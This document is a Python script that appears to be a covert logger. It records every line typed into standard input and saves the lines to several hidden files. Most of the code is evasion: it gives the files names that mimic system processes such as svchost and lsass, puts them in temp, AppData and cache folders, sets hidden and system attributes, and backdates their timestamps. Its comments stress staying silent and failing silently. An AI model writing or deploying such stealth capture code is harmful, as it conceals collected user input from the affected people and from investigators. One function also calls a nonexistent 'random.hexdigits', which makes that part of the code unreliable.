import os
import sys
import time
import random
import string
import subprocess
import platform
from datetime import datetime

# ========== PLATFORM DETECTION ==========
IS_WINDOWS = platform.system() == 'Windows'
IS_LINUX = platform.system() == 'Linux'
IS_MAC = platform.system() == 'Darwin'

# ========== TRY TO IMPORT WINDOWS MODULES ==========
HAS_WIN32 = False
if IS_WINDOWS:
    try:
        import win32api
        import win32con
        HAS_WIN32 = True
    except ImportError:
        pass  # Silent - no announcement

# ========== RANDOM FILENAME GENERATORS ==========

def random_string(length=8):
    letters_digits = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters_digits) for _ in range(length))

def random_hex_string(length=8):
    hex_chars = string.hexdigits.lower()
    return ''.join(random.choice(hex_chars) for _ in range(length))

def random_guid_style():
    sections = [8, 4, 4, 4, 12]
    parts = []
    for section in sections:
        parts.append(''.join(random.choice(string.hexdigits.lower()) for _ in range(section)))
    return '{' + '-'.join(parts) + '}'

def random_legitimate_name():
    legitimate_prefixes = [
        "svchost", "runtime", "winlog", "services", "system",
        "chrome", "edge", "firefox", "explorer", "dwm",
        "csrss", "lsass", "smss", "wininit", "taskhost",
        "office", "vsstudio", "vscode", "sql", "python",
        "update", "installer", "cache", "tmp", "temp"
    ]
    legitimate_suffixes = [
        ".log", ".tmp", ".dat", ".cache", ".bin",
        ".db", ".temp", ".txt", ".ini", ".cfg"
    ]
    prefix = random.choice(legitimate_prefixes)
    suffix = random.choice(legitimate_suffixes)
    if random.choice([True, False]):
        return f"{prefix}{random.randint(1, 999)}{suffix}"
    return f"{prefix}{suffix}"

def random_system_mimic():
    if IS_WINDOWS:
        system_patterns = [
            f"win{random.randint(10, 32)}.log",
            f"event{random.randint(100, 999)}.evtx",
            f"app{random.hexdigits.lower()[:4]}.dat",
            f"ms{random.randint(1, 9)}0{random.randint(1, 9)}.tmp",
            f"~${random_string(4)}.tmp",
            f".{random_string(6)}.cache"
        ]
    else:
        system_patterns = [
            f".{random_string(6)}.cache",
            f"systemd-{random_string(8)}.log",
            f"kernel-{random_hex_string(6)}.log",
            f".{random_string(4)}.swp",
            f"core.{random_hex_string(8)}",
            f"hsperfdata_{random_string(6)}"
        ]
    return random.choice(system_patterns)

def get_random_filename(style="random", custom_ext=".txt"):
    if custom_ext.startswith('.'):
        ext = custom_ext
    else:
        ext = f".{custom_ext}"

    if style == "random":
        name = random_string(8)
    elif style == "hex":
        name = random_hex_string(8)
    elif style == "guid":
        name = random_guid_style()
    elif style == "legit":
        name = random_legitimate_name()
        return name if '.' in name else name + ext
    elif style == "system":
        name = random_system_mimic()
        return name if '.' in name else name + ext
    elif style == "timestamp":
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        random_part = random_string(4)
        name = f"{timestamp}_{random_part}"
    else:
        name = random_string(8)

    return name + ext

# ========== CROSS-PLATFORM STEALTH FUNCTIONS ==========

def hide_file_windows(filepath):
    if not HAS_WIN32:
        return False
    try:
        attrs = win32api.GetFileAttributes(filepath)
        win32api.SetFileAttributes(filepath,
            attrs | win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
        return True
    except Exception:
        return False

def hide_file_unix(filepath):
    try:
        dirname = os.path.dirname(filepath)
        basename = os.path.basename(filepath)
        if not basename.startswith('.'):
            new_path = os.path.join(dirname, '.' + basename)
            os.rename(filepath, new_path)
            return True
        return True
    except Exception:
        return False

def hide_file_mac(filepath):
    try:
        subprocess.run(['chflags', 'hidden', filepath], capture_output=True, check=False)
        return True
    except Exception:
        return hide_file_unix(filepath)

def hide_file(filepath):
    if IS_WINDOWS and HAS_WIN32:
        return hide_file_windows(filepath)
    elif IS_WINDOWS and not HAS_WIN32:
        try:
            subprocess.run(['attrib', '+h', '+s', filepath], shell=True, capture_output=True)
            return True
        except Exception:
            return False
    elif IS_MAC:
        return hide_file_mac(filepath)
    elif IS_LINUX:
        return hide_file_unix(filepath)
    return False

def unhide_file_windows(filepath):
    if not HAS_WIN32:
        try:
            subprocess.run(['attrib', '-h', '-s', filepath], shell=True, capture_output=True)
            return True
        except Exception:
            return False
    try:
        attrs = win32api.GetFileAttributes(filepath)
        win32api.SetFileAttributes(filepath, attrs & ~(2 | 4))
        return True
    except Exception:
        return False

def unhide_file_unix(filepath):
    try:
        dirname = os.path.dirname(filepath)
        basename = os.path.basename(filepath)
        if basename.startswith('.'):
            new_path = os.path.join(dirname, basename[1:])
            os.rename(filepath, new_path)
            return True
        return True
    except Exception:
        return False

def unhide_file(filepath):
    if IS_WINDOWS:
        return unhide_file_windows(filepath)
    return unhide_file_unix(filepath)

def spoof_timestamp(filepath):
    try:
        days_old = random.randint(30, 180)
        old_time = time.time() - (days_old * 86400)
        os.utime(filepath, (old_time, old_time))
        return days_old
    except Exception:
        return None

def make_file_stealthy(filepath):
    """Apply stealth techniques - silent"""
    hide_file(filepath)
    spoof_timestamp(filepath)

# ========== LOCATION GENERATION ==========

def get_stealth_locations():
    if IS_WINDOWS:
        base_locations = [
            ".",
            "./logs/",
            os.path.expandvars("%TEMP%"),
            os.path.expandvars("%APPDATA%\\Microsoft\\"),
            os.path.expanduser("~/AppData/Local/Temp/")
        ]
    elif IS_MAC:
        base_locations = [
            ".",
            "./logs/",
            "/tmp/",
            os.path.expanduser("~/Library/Caches/"),
            os.path.expanduser("~/.cache/")
        ]
    else:  # Linux
        base_locations = [
            ".",
            "./logs/",
            "/tmp/",
            os.path.expanduser("~/.cache/"),
            os.path.expanduser("~/.local/share/")
        ]

    stealth_locations = []
    styles = ["legit", "system", "hex", "timestamp", "random"]

    for i, base in enumerate(base_locations):
        style = styles[i % len(styles)]
        filename = get_random_filename(style)
        full_path = os.path.join(base, filename)
        stealth_locations.append({
            'path': full_path,
            'style': style,
            'base': base,
            'filename': os.path.basename(full_path)
        })
    return stealth_locations

# ========== SAVE FUNCTION (SILENT) ==========

def save_all(saved_words):
    """Save captured data to all stealth locations - completely silent"""
    stealth_locations = get_stealth_locations()
    for location_info in stealth_locations:
        try:
            location = location_info['path']
            folder = os.path.dirname(location)
            if folder:
                os.makedirs(folder, exist_ok=True)
            with open(location, "w", encoding='utf-8') as f:
                for item in saved_words:
                    f.write(item + "\n")
            make_file_stealthy(location)
        except Exception:
            pass  # Fail silently

# ========== MAIN LOGGER ==========

def main():
    saved_words = []

    while True:
        try:
            user_input = input()
        except (EOFError, KeyboardInterrupt):
            save_all(saved_words)
            break

        if user_input == "STOP":
            save_all(saved_words)
            break
        else:
            saved_words.append(user_input)

# ========== RUN ==========
if __name__ == "__main__":
    main()
